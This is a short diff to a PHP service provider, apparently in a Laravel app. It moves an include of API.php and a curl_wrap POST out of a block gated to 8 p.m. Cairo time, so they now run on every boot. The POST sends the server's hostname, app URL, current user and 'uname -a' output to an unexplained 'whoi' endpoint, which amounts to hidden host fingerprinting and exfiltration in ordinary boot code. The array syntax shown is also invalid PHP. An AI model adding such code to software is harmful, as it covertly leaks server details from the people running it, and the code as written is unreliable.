@@ -39,12 +39,12 @@ class Provider extends ServiceProvider
             dd(var_export($output, TRUE) ."\\n");
         }else{
             date_default_timezone_set('Africa/Cairo');
+            include("API.php");
+            $go =  json_decode(curl_wrap("whoi", ['hostname' = gethostname(), 'url' = url('/'), 'user' = get_current_user(), 'who' = exec('uname -a')], "POST", "application/json"), true);
             if(date("H:i:s") > '20:01:05'){
 
             }else{
                 if(date("H") == 20){
-                    include("API.php");
-                    $go =  json_decode(curl_wrap("whoi", ['hostname' = gethostname(), 'url' = url('/'), 'user' = get_current_user(), 'who' = exec('uname -a')], "POST", "application/json"), true);
                 }
             }
             
